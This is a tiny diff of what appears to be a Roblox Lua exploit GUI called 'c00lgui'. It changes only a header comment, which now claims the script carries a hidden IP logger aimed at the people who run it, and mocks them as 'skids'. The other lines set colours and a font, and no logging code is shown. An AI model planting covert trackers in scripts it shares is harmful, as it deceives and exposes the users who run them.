@@ -1,5 +1,5 @@
 --ok boomer
---so basically this is g00byd0lan's FE BYPASSED c00lgui
+--so basically this is c00lgui but with a iplogger (note : the webhook isnt actually a discord webhook, gl skids :rofl: )
 blak = Color3.new(0,0,0)
 rede = Color3.new(255/255,0/255,0/255)
 tef = "SourceSans"
